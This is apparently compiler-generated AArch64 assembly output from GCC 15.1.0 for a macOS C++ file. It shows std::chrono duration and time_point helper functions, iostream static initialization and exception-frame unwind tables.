	.globl __ZNSt6chronomiINS_3_V212system_clockENS_8durationIxSt5ratioILl1ELl1000000000EEEES6_EENSt11common_typeIJT0_T1_EE4typeERKNS_10time_pointIT_S8_EERKNSC_ISD_S9_EE
	.weak_definition __ZNSt6chronomiINS_3_V212system_clockENS_8durationIxSt5ratioILl1ELl1000000000EEEES6_EENSt11common_typeIJT0_T1_EE4typeERKNS_10time_pointIT_S8_EERKNSC_ISD_S9_EE
__ZNSt6chronomiINS_3_V212system_clockENS_8durationIxSt5ratioILl1ELl1000000000EEEES6_EENSt11common_typeIJT0_T1_EE4typeERKNS_10time_pointIT_S8_EERKNSC_ISD_S9_EE:
LFB2989:
	stp	x29, x30, [sp, -48]!	;,,,
LCFI35:
	mov	x29, sp	;,
LCFI36:
	str	x0, [x29, 24]	; __lhs, __lhs
	str	x1, [x29, 16]	; __rhs, __rhs
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:1147:       { return __lhs.time_since_epoch() - __rhs.time_since_epoch(); }
	ldr	x0, [x29, 24]	;, __lhs
	bl	__ZNKSt6chrono10time_pointINS_3_V212system_clockENS_8durationIxSt5ratioILl1ELl1000000000EEEEE16time_since_epochEv		;
	str	x0, [x29, 32]	; tmp103, D.53787
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:1147:       { return __lhs.time_since_epoch() - __rhs.time_since_epoch(); }
	ldr	x0, [x29, 16]	;, __rhs
	bl	__ZNKSt6chrono10time_pointINS_3_V212system_clockENS_8durationIxSt5ratioILl1ELl1000000000EEEEE16time_since_epochEv		;
	str	x0, [x29, 40]	; tmp104, D.53788
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:1147:       { return __lhs.time_since_epoch() - __rhs.time_since_epoch(); }
	add	x1, x29, 40	; tmp105,,
	add	x0, x29, 32	; tmp106,,
	bl	__ZNSt6chronomiIxSt5ratioILl1ELl1000000000EExS2_EENSt11common_typeIJNS_8durationIT_T0_EENS4_IT1_T2_EEEE4typeERKS7_RKSA_		;
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:1147:       { return __lhs.time_since_epoch() - __rhs.time_since_epoch(); }
	ldp	x29, x30, [sp], 48	;,,,
LCFI37:
	ret	
LFE2989:
	.align	2
	.globl __ZNSt6chrono13duration_castINS_8durationIxSt5ratioILl1ELl1000000000EEEExS3_EENSt9enable_ifIXsrNS_13__is_durationIT_EE5valueES7_E4typeERKNS1_IT0_T1_EE
	.weak_definition __ZNSt6chrono13duration_castINS_8durationIxSt5ratioILl1ELl1000000000EEEExS3_EENSt9enable_ifIXsrNS_13__is_durationIT_EE5valueES7_E4typeERKNS1_IT0_T1_EE
__ZNSt6chrono13duration_castINS_8durationIxSt5ratioILl1ELl1000000000EEEExS3_EENSt9enable_ifIXsrNS_13__is_durationIT_EE5valueES7_E4typeERKNS1_IT0_T1_EE:
LFB2990:
	stp	x29, x30, [sp, -32]!	;,,,
LCFI38:
	mov	x29, sp	;,
LCFI39:
	str	x0, [x29, 24]	; __d, __d
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:293: 	  return __dc::__cast(__d);
	ldr	x0, [x29, 24]	;, __d
	bl	__ZNSt6chrono20__duration_cast_implINS_8durationIxSt5ratioILl1ELl1000000000EEEES2_ILl1ELl1EExLb1ELb1EE6__castIxS3_EES4_RKNS1_IT_T0_EE		;
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:297:       }
	ldp	x29, x30, [sp], 32	;,,,
LCFI40:
	ret	
LFE2990:
	.align	2
	.globl __ZNSt6chronomiIxSt5ratioILl1ELl1000000000EExS2_EENSt11common_typeIJNS_8durationIT_T0_EENS4_IT1_T2_EEEE4typeERKS7_RKSA_
	.weak_definition __ZNSt6chronomiIxSt5ratioILl1ELl1000000000EExS2_EENSt11common_typeIJNS_8durationIT_T0_EENS4_IT1_T2_EEEE4typeERKS7_RKSA_
__ZNSt6chronomiIxSt5ratioILl1ELl1000000000EExS2_EENSt11common_typeIJNS_8durationIT_T0_EENS4_IT1_T2_EEEE4typeERKS7_RKSA_:
LFB3072:
	stp	x29, x30, [sp, -80]!	;,,,
LCFI41:
	mov	x29, sp	;,
LCFI42:
	str	x19, [sp, 16]	;,
LCFI43:
	str	x0, [x29, 40]	; __lhs, __lhs
	str	x1, [x29, 32]	; __rhs, __rhs
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:720: 	return __cd(__cd(__lhs).count() - __cd(__rhs).count());
	ldr	x0, [x29, 40]	; tmp106, __lhs
	ldr	x0, [x0]	; tmp107, *__lhs_5(D)
	str	x0, [x29, 64]	; tmp107, D.54246
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:720: 	return __cd(__cd(__lhs).count() - __cd(__rhs).count());
	add	x0, x29, 64	; tmp108,,
	bl	__ZNKSt6chrono8durationIxSt5ratioILl1ELl1000000000EEE5countEv		;
	mov	x19, x0	; _1,
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:720: 	return __cd(__cd(__lhs).count() - __cd(__rhs).count());
	ldr	x0, [x29, 32]	; tmp109, __rhs
	ldr	x0, [x0]	; tmp110, *__rhs_8(D)
	str	x0, [x29, 72]	; tmp110, D.54247
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:720: 	return __cd(__cd(__lhs).count() - __cd(__rhs).count());
	add	x0, x29, 72	; tmp111,,
	bl	__ZNKSt6chrono8durationIxSt5ratioILl1ELl1000000000EEE5countEv		;
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:720: 	return __cd(__cd(__lhs).count() - __cd(__rhs).count());
	sub	x0, x19, x0	; _3, _1, _2
	str	x0, [x29, 56]	; _3, D.54248
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:720: 	return __cd(__cd(__lhs).count() - __cd(__rhs).count());
	add	x1, x29, 56	; tmp112,,
	add	x0, x29, 48	; tmp113,,
	bl	__ZNSt6chrono8durationIxSt5ratioILl1ELl1000000000EEEC1IxvEERKT_		;
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:720: 	return __cd(__cd(__lhs).count() - __cd(__rhs).count());
	ldr	x0, [x29, 48]	; D.54955, D.54249
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:721:       }
	ldr	x19, [sp, 16]	;,
	ldp	x29, x30, [sp], 80	;,,,
LCFI44:
	ret	
LFE3072:
	.align	2
	.globl __ZNSt6chrono20__duration_cast_implINS_8durationIxSt5ratioILl1ELl1000000000EEEES2_ILl1ELl1EExLb1ELb1EE6__castIxS3_EES4_RKNS1_IT_T0_EE
	.weak_definition __ZNSt6chrono20__duration_cast_implINS_8durationIxSt5ratioILl1ELl1000000000EEEES2_ILl1ELl1EExLb1ELb1EE6__castIxS3_EES4_RKNS1_IT_T0_EE
__ZNSt6chrono20__duration_cast_implINS_8durationIxSt5ratioILl1ELl1000000000EEEES2_ILl1ELl1EExLb1ELb1EE6__castIxS3_EES4_RKNS1_IT_T0_EE:
LFB3073:
	stp	x29, x30, [sp, -48]!	;,,,
LCFI45:
	mov	x29, sp	;,
LCFI46:
	str	x0, [x29, 24]	; __d, __d
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:205: 	    return _ToDur(static_cast<__to_rep>(__d.count()));
	ldr	x0, [x29, 24]	;, __d
	bl	__ZNKSt6chrono8durationIxSt5ratioILl1ELl1000000000EEE5countEv		;
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:205: 	    return _ToDur(static_cast<__to_rep>(__d.count()));
	str	x0, [x29, 40]	; _1, D.54264
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:205: 	    return _ToDur(static_cast<__to_rep>(__d.count()));
	add	x1, x29, 40	; tmp104,,
	add	x0, x29, 32	; tmp105,,
	bl	__ZNSt6chrono8durationIxSt5ratioILl1ELl1000000000EEEC1IxvEERKT_		;
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:205: 	    return _ToDur(static_cast<__to_rep>(__d.count()));
	ldr	x0, [x29, 32]	; D.54963, D.54265
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:206: 	  }
	ldp	x29, x30, [sp], 48	;,,,
LCFI47:
	ret	
LFE3073:
	.section	__TEXT,__StaticInit,regular,pure_instructions
	.align	2
__Z41__static_initialization_and_destruction_0v:
LFB3172:
	stp	x29, x30, [sp, -16]!	;,,,
LCFI48:
	mov	x29, sp	;,
LCFI49:
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/iostream:82:   static ios_base::Init __ioinit;
	adrp	x0, __ZStL8__ioinit@PAGE	; tmp101,
	add	x0, x0, __ZStL8__ioinit@PAGEOFF;	;, tmp101,
	bl	__ZNSt8ios_base4InitC1Ev		;
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/iostream:82:   static ios_base::Init __ioinit;
	adrp	x0, ___dso_handle@PAGE	; tmp102,
	add	x2, x0, ___dso_handle@PAGEOFF;	;, tmp102,
	adrp	x0, __ZStL8__ioinit@PAGE	; tmp103,
	add	x1, x0, __ZStL8__ioinit@PAGEOFF;	;, tmp103,
	adrp	x0, __ZNSt8ios_base4InitD1Ev@GOTPAGE	;,
	ldr	x0, [x0, __ZNSt8ios_base4InitD1Ev@GOTPAGEOFF]	;,
	bl	___cxa_atexit		;
; 1.cpp:120: }
	nop	
	ldp	x29, x30, [sp], 16	;,,,
LCFI50:
	ret	
LFE3172:
	.align	2
__GLOBAL__sub_I_1.cpp:
LFB3173:
	stp	x29, x30, [sp, -16]!	;,,,
LCFI51:
	mov	x29, sp	;,
LCFI52:
; 1.cpp:120: }
	bl	__Z41__static_initialization_and_destruction_0v		;
	ldp	x29, x30, [sp], 16	;,,,
LCFI53:
	ret	
LFE3173:
	.section __TEXT,__eh_frame,coalesced,no_toc+strip_static_syms+live_support
EH_frame1:
	.set L$set$0,LECIE1-LSCIE1
	.long L$set$0
LSCIE1:
	.long	0
	.byte	0x3
	.ascii "zR\0"
	.uleb128 0x1
	.sleb128 -8
	.uleb128 0x1e
	.uleb128 0x1
	.byte	0x10
	.byte	0xc
	.uleb128 0x1f
	.uleb128 0
	.align	3
LECIE1:
LSFDE1:
	.set L$set$1,LEFDE1-LASFDE1
	.long L$set$1
LASFDE1:
	.long	LASFDE1-EH_frame1
	.quad	LFB1167-.
	.set L$set$2,LFE1167-LFB1167
	.quad L$set$2
	.uleb128 0
	.byte	0x4
	.set L$set$3,LCFI0-LFB1167
	.long L$set$3
	.byte	0xe
	.uleb128 0x10
	.byte	0x4
	.set L$set$4,LCFI1-LCFI0
	.long L$set$4
	.byte	0xe
	.uleb128 0
	.align	3
LEFDE1:
LSFDE3:
	.set L$set$5,LEFDE3-LASFDE3
	.long L$set$5
LASFDE3:
	.long	LASFDE3-EH_frame1
	.quad	LFB1168-.
	.set L$set$6,LFE1168-LFB1168
	.quad L$set$6
	.uleb128 0
	.byte	0x4
	.set L$set$7,LCFI2-LFB1168
	.long L$set$7
	.byte	0xe
	.uleb128 0x10
	.byte	0x4
	.set L$set$8,LCFI3-LCFI2
	.long L$set$8
	.byte	0xe
	.uleb128 0
	.align	3
LEFDE3:
LSFDE5:
	.set L$set$9,LEFDE5-LASFDE5
	.long L$set$9
LASFDE5:
	.long	LASFDE5-EH_frame1
	.quad	LFB1170-.
	.set L$set$10,LFE1170-LFB1170
	.quad L$set$10
	.uleb128 0
	.byte	0x4
	.set L$set$11,LCFI4-LFB1170
	.long L$set$11
	.byte	0xe
	.uleb128 0x10
	.byte	0x4
	.set L$set$12,LCFI5-LCFI4
	.long L$set$12
	.byte	0xe
	.uleb128 0
	.align	3
LEFDE5:
LSFDE7:
	.set L$set$13,LEFDE7-LASFDE7
	.long L$set$13
LASFDE7:
	.long	LASFDE7-EH_frame1
	.quad	LFB1171-.
	.set L$set$14,LFE1171-LFB1171
	.quad L$set$14
	.uleb128 0
	.byte	0x4
	.set L$set$15,LCFI6-LFB1171
	.long L$set$15
	.byte	0xe
	.uleb128 0x20
	.byte	0x9d
	.uleb128 0x4
	.byte	0x9e
	.uleb128 0x3
	.byte	0x4
	.set L$set$16,LCFI7-LCFI6
	.long L$set$16
	.byte	0xd
	.uleb128 0x1d
	.byte	0x4
	.set L$set$17,LCFI8-LCFI7
	.long L$set$17
	.byte	0xde
	.byte	0xdd
	.byte	0xc
	.uleb128 0x1f
	.uleb128 0
	.align	3
LEFDE7:
LSFDE9:
	.set L$set$18,LEFDE9-LASFDE9
	.long L$set$18
LASFDE9:
	.long	LASFDE9-EH_frame1
	.quad	LFB1172-.
	.set L$set$19,LFE1172-LFB1172
	.quad L$set$19
	.uleb128 0
	.byte	0x4
	.set L$set$20,LCFI9-LFB1172
	.long L$set$20
	.byte	0xe
	.uleb128 0x20
	.byte	0x9d
	.uleb128 0x4
	.byte	0x9e
	.uleb128 0x3
	.byte	0x4
	.set L$set$21,LCFI10-LCFI9
	.long L$set$21
	.byte	0xd
	.uleb128 0x1d
	.byte	0x4
	.set L$set$22,LCFI11-LCFI10
	.long L$set$22
	.byte	0xde
	.byte	0xdd
	.byte	0xc
	.uleb128 0x1f
	.uleb128 0
	.align	3
LEFDE9:
LSFDE11:
	.set L$set$23,LEFDE11-LASFDE11
	.long L$set$23
LASFDE11:
	.long	LASFDE11-EH_frame1
	.quad	LFB1201-.
	.set L$set$24,LFE1201-LFB1201
	.quad L$set$24
	.uleb128 0
	.byte	0x4
	.set L$set$25,LCFI12-LFB1201
	.long L$set$25
	.byte	0xe
	.uleb128 0x40
	.byte	0x9d
	.uleb128 0x8
	.byte	0x9e
	.uleb128 0x7
	.byte	0x4
	.set L$set$26,LCFI13-LCFI12
	.long L$set$26
	.byte	0xd
	.uleb128 0x1d
	.byte	0x4
	.set L$set$27,LCFI14-LCFI13
	.long L$set$27
	.byte	0x93
	.uleb128 0x6
	.byte	0x4
	.set L$set$28,LCFI15-LCFI14
	.long L$set$28
	.byte	0xde
	.byte	0xdd
	.byte	0xd3
	.byte	0xc
	.uleb128 0x1f
	.uleb128 0
	.align	3
LEFDE11:
LSFDE13:
	.set L$set$29,LEFDE13-LASFDE13
	.long L$set$29
LASFDE13:
	.long	LASFDE13-EH_frame1
	.quad	LFB1229-.
	.set L$set$30,LFE1229-LFB1229
	.quad L$set$30
	.uleb128 0
	.byte	0x4
	.set L$set$31,LCFI16-LFB1229
	.long L$set$31
	.byte	0xe
	.uleb128 0x20
	.byte	0x9d
	.uleb128 0x4
	.byte	0x9e
	.uleb128 0x3
	.byte	0x4
	.set L$set$32,LCFI17-LCFI16
	.long L$set$32
	.byte	0xd
	.uleb128 0x1d
	.byte	0x4
	.set L$set$33,LCFI18-LCFI17
	.long L$set$33
	.byte	0xde
	.byte	0xdd
	.byte	0xc
	.uleb128 0x1f
	.uleb128 0
	.align	3
LEFDE13:
LSFDE15:
	.set L$set$34,LEFDE15-LASFDE15
	.long L$set$34
LASFDE15:
	.long	LASFDE15-EH_frame1
	.quad	LFB2248-.
	.set L$set$35,LFE2248-LFB2248
	.quad L$set$35
	.uleb128 0
	.byte	0x4
	.set L$set$36,LCFI19-LFB2248
	.long L$set$36
	.byte	0xe
	.uleb128 0x10
	.byte	0x4
	.set L$set$37,LCFI20-LCFI19
	.long L$set$37
	.byte	0xe
	.uleb128 0
	.align	3
LEFDE15:
LSFDE17:
	.set L$set$38,LEFDE17-LASFDE17
	.long L$set$38
LASFDE17:
	.long	LASFDE17-EH_frame1
	.quad	LFB2250-.
	.set L$set$39,LFE2250-LFB2250
	.quad L$set$39
	.uleb128 0
	.byte	0x4
	.set L$set$40,LCFI21-LFB2250
	.long L$set$40
	.byte	0xe
	.uleb128 0x10
	.byte	0x4
	.set L$set$41,LCFI22-LCFI21
	.long L$set$41
	.byte	0xe
	.uleb128 0
	.align	3
LEFDE17:
LSFDE19:
	.set L$set$42,LEFDE19-LASFDE19
	.long L$set$42
LASFDE19:
	.long	LASFDE19-EH_frame1
	.quad	LFB2758-.
	.set L$set$43,LFE2758-LFB2758
	.quad L$set$43
	.uleb128 0
	.byte	0x4
	.set L$set$44,LCFI23-LFB2758
	.long L$set$44
	.byte	0xe
	.uleb128 0x20
	.byte	0x4
	.set L$set$45,LCFI24-LCFI23
	.long L$set$45
	.byte	0xe
	.uleb128 0
	.align	3
LEFDE19:
LSFDE21:
	.set L$set$46,LEFDE21-LASFDE21
	.long L$set$46
LASFDE21:
	.long	LASFDE21-EH_frame1
	.quad	LFB2759-.
	.set L$set$47,LFE2759-LFB2759
	.quad L$set$47
	.uleb128 0
	.byte	0x4
	.set L$set$48,LCFI25-LFB2759
	.long L$set$48
	.byte	0xe
	.uleb128 0x50
	.byte	0x9d
	.uleb128 0xa
	.byte	0x9e
	.uleb128 0x9
	.byte	0x4
	.set L$set$49,LCFI26-LCFI25
	.long L$set$49
	.byte	0xd
	.uleb128 0x1d
	.byte	0x4
	.set L$set$50,LCFI27-LCFI26
	.long L$set$50
	.byte	0xde
	.byte	0xdd
	.byte	0xc
	.uleb128 0x1f
	.uleb128 0
	.align	3
LEFDE21:
LSFDE23:
	.set L$set$51,LEFDE23-LASFDE23
	.long L$set$51
LASFDE23:
	.long	LASFDE23-EH_frame1
	.quad	LFB2760-.
	.set L$set$52,LFE2760-LFB2760
	.quad L$set$52
	.uleb128 0
	.byte	0x4
	.set L$set$53,LCFI28-LFB2760
	.long L$set$53
	.byte	0xe
	.uleb128 0x20
	.byte	0x4
	.set L$set$54,LCFI29-LCFI28
	.long L$set$54
	.byte	0xe
	.uleb128 0
	.align	3
LEFDE23:
LSFDE25:
	.set L$set$55,LEFDE25-LASFDE25
	.long L$set$55
LASFDE25:
	.long	LASFDE25-EH_frame1
	.quad	LFB2761-.
	.set L$set$56,LFE2761-LFB2761
	.quad L$set$56
	.uleb128 0
	.byte	0x4
	.set L$set$57,LCFI30-LFB2761
	.long L$set$57
	.byte	0xe
	.uleb128 0x50
	.byte	0x9d
	.uleb128 0xa
	.byte	0x9e
	.uleb128 0x9
	.byte	0x4
	.set L$set$58,LCFI31-LCFI30
	.long L$set$58
	.byte	0xd
	.uleb128 0x1d
	.byte	0x4
	.set L$set$59,LCFI32-LCFI31
	.long L$set$59
	.byte	0xde
	.byte	0xdd
	.byte	0xc
	.uleb128 0x1f
	.uleb128 0
	.align	3
LEFDE25:
LSFDE27:
	.set L$set$60,LEFDE27-LASFDE27
	.long L$set$60
LASFDE27:
	.long	LASFDE27-EH_frame1
	.quad	LFB2978-.
	.set L$set$61,LFE2978-LFB2978
	.quad L$set$61
	.uleb128 0
	.byte	0x4
	.set L$set$62,LCFI33-LFB2978
	.long L$set$62
	.byte	0xe
	.uleb128 0x10
	.byte	0x4
	.set L$set$63,LCFI34-LCFI33
	.long L$set$63
	.byte	0xe
	.uleb128 0
	.align	3
LEFDE27:
LSFDE29:
	.set L$set$64,LEFDE29-LASFDE29
	.long L$set$64
LASFDE29:
	.long	LASFDE29-EH_frame1
	.quad	LFB2989-.
	.set L$set$65,LFE2989-LFB2989
	.quad L$set$65
	.uleb128 0
	.byte	0x4
	.set L$set$66,LCFI35-LFB2989
	.long L$set$66
	.byte	0xe
	.uleb128 0x30
	.byte	0x9d
	.uleb128 0x6
	.byte	0x9e
	.uleb128 0x5
	.byte	0x4
	.set L$set$67,LCFI36-LCFI35
	.long L$set$67
	.byte	0xd
	.uleb128 0x1d
	.byte	0x4
	.set L$set$68,LCFI37-LCFI36
	.long L$set$68
	.byte	0xde
	.byte	0xdd
	.byte	0xc
	.uleb128 0x1f
	.uleb128 0
	.align	3
LEFDE29:
LSFDE31:
	.set L$set$69,LEFDE31-LASFDE31
	.long L$set$69
LASFDE31:
	.long	LASFDE31-EH_frame1
	.quad	LFB2990-.
	.set L$set$70,LFE2990-LFB2990
	.quad L$set$70
	.uleb128 0
	.byte	0x4
	.set L$set$71,LCFI38-LFB2990
	.long L$set$71
	.byte	0xe
	.uleb128 0x20
	.byte	0x9d
	.uleb128 0x4
	.byte	0x9e
	.uleb128 0x3
	.byte	0x4
	.set L$set$72,LCFI39-LCFI38
	.long L$set$72
	.byte	0xd
	.uleb128 0x1d
	.byte	0x4
	.set L$set$73,LCFI40-LCFI39
	.long L$set$73
	.byte	0xde
	.byte	0xdd
	.byte	0xc
	.uleb128 0x1f
	.uleb128 0
	.align	3
LEFDE31:
LSFDE33:
	.set L$set$74,LEFDE33-LASFDE33
	.long L$set$74
LASFDE33:
	.long	LASFDE33-EH_frame1
	.quad	LFB3072-.
	.set L$set$75,LFE3072-LFB3072
	.quad L$set$75
	.uleb128 0
	.byte	0x4
	.set L$set$76,LCFI41-LFB3072
	.long L$set$76
	.byte	0xe
	.uleb128 0x50
	.byte	0x9d
	.uleb128 0xa
	.byte	0x9e
	.uleb128 0x9
	.byte	0x4
	.set L$set$77,LCFI42-LCFI41
	.long L$set$77
	.byte	0xd
	.uleb128 0x1d
	.byte	0x4
	.set L$set$78,LCFI43-LCFI42
	.long L$set$78
	.byte	0x93
	.uleb128 0x8
	.byte	0x4
	.set L$set$79,LCFI44-LCFI43
	.long L$set$79
	.byte	0xde
	.byte	0xdd
	.byte	0xd3
	.byte	0xc
	.uleb128 0x1f
	.uleb128 0
	.align	3
LEFDE33:
LSFDE35:
	.set L$set$80,LEFDE35-LASFDE35
	.long L$set$80
LASFDE35:
	.long	LASFDE35-EH_frame1
	.quad	LFB3073-.
	.set L$set$81,LFE3073-LFB3073
	.quad L$set$81
	.uleb128 0
	.byte	0x4
	.set L$set$82,LCFI45-LFB3073
	.long L$set$82
	.byte	0xe
	.uleb128 0x30
	.byte	0x9d
	.uleb128 0x6
	.byte	0x9e
	.uleb128 0x5
	.byte	0x4
	.set L$set$83,LCFI46-LCFI45
	.long L$set$83
	.byte	0xd
	.uleb128 0x1d
	.byte	0x4
	.set L$set$84,LCFI47-LCFI46
	.long L$set$84
	.byte	0xde
	.byte	0xdd
	.byte	0xc
	.uleb128 0x1f
	.uleb128 0
	.align	3
LEFDE35:
LSFDE37:
	.set L$set$85,LEFDE37-LASFDE37
	.long L$set$85
LASFDE37:
	.long	LASFDE37-EH_frame1
	.quad	LFB3172-.
	.set L$set$86,LFE3172-LFB3172
	.quad L$set$86
	.uleb128 0
	.byte	0x4
	.set L$set$87,LCFI48-LFB3172
	.long L$set$87
	.byte	0xe
	.uleb128 0x10
	.byte	0x9d
	.uleb128 0x2
	.byte	0x9e
	.uleb128 0x1
	.byte	0x4
	.set L$set$88,LCFI49-LCFI48
	.long L$set$88
	.byte	0xd
	.uleb128 0x1d
	.byte	0x4
	.set L$set$89,LCFI50-LCFI49
	.long L$set$89
	.byte	0xde
	.byte	0xdd
	.byte	0xc
	.uleb128 0x1f
	.uleb128 0
	.align	3
LEFDE37:
LSFDE39:
	.set L$set$90,LEFDE39-LASFDE39
	.long L$set$90
LASFDE39:
	.long	LASFDE39-EH_frame1
	.quad	LFB3173-.
	.set L$set$91,LFE3173-LFB3173
	.quad L$set$91
	.uleb128 0
	.byte	0x4
	.set L$set$92,LCFI51-LFB3173
	.long L$set$92
	.byte	0xe
	.uleb128 0x10
	.byte	0x9d
	.uleb128 0x2
	.byte	0x9e
	.uleb128 0x1
	.byte	0x4
	.set L$set$93,LCFI52-LCFI51
	.long L$set$93
	.byte	0xd
	.uleb128 0x1d
	.byte	0x4
	.set L$set$94,LCFI53-LCFI52
	.long L$set$94
	.byte	0xde
	.byte	0xdd
	.byte	0xc
	.uleb128 0x1f
	.uleb128 0
	.align	3
LEFDE39:
	.private_extern ___dso_handle
	.ident	"GCC: (Homebrew GCC 15.1.0) 15.1.0"
	.mod_init_func
_Mod.init:
	.align	3
	.xword	__GLOBAL__sub_I_1.cpp
	.subsections_via_symbols
